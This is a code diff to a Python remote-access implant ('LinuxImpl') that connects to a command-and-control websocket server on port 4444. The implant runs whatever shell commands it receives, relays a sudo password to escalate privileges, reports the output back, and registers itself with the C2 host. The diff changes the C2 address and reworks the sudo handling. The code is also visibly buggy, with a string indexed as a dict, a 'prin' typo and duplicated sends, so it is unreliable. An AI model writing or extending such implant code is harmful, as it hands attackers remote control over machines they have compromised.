@@ -71,35 +71,48 @@ class LinuxImpl:
         except ConnectionClosedError:
             pass
         except Exception as e:
-            await ws.send(json.dumps({"error": str(e)}))
+            await ws.send(json.dumps({"result": str(e)}))
     
     async def _execute_command(self, ws, command: str) -> None:
-        command = command.strip()
-        print(command)
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
         else:
             if command.startswith("sudo ") or command.startswith("sudo"):
 
-                print("assudo")
                 await ws.send(json.dumps({"prompt": "sudo password: "}))
                 msg = await ws.recv()
 
                 data = json.loads(msg.replace("'", '"'))
-                password = data['pass']
+                print(data)
+                password = msg['pass']
                
-                #replacement = if 
-                print(f'"echo {password}" | sudo -S {command.replace("sudo","")}')
+                command = command.replace("sudo", "").replace('"', '\\"').split(' ')
+
+                full_command = ['sudo', '-S']
+                full_command.extend(command)
+                full_command = [ x for x in full_command if x ]
+
+                print(full_command)
                 proc = subprocess.Popen(
-                    ['/bin/bash', '-c', f'cd "{self.current_dir}" && "echo {password}" | sudo -S {command.replace("sudo","")}'],
+                    full_command,
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     text=True
                 )
-                out, err = proc.communicate(password + "\n", timeout=60)
+
+                stdout, stderr = proc.communicate(password + '\n')
+
+                await ws.send(json.dumps({
+                    "result": stdout if stdout else stderr
+                }))
+
             else:
                 out, err, _ = self._execute_shell_command(command)
+                
+                await ws.send(json.dumps({
+                    "result": out if out else err,
+                }))
 
             await ws.send(json.dumps({
                 "result": out if out else err,
@@ -507,7 +520,7 @@ class LinuxImpl:
  
 
         try:
-            req = requests.post(f"http://192.168.100.12:4444/api/impl/new/{model['impl_id']}", data=model, timeout=10)
+            req = requests.post(f"http://192.168.32.1:4444/api/impl/new/{model['impl_id']}", data=model, timeout=10)
             prin(req.status_code)
         except Exception as e:
             #print(e)
@@ -581,7 +594,7 @@ class LinuxImpl:
         sys.exit(1)
 
 if __name__ == "__main__":
-    C2_WS_URL = "ws://192.168.100.12:4444/api/rcv"
+    C2_WS_URL = "ws://192.168.32.1:4444/api/rcv"
     GROUP_NAME = "grupo"
 
     try:
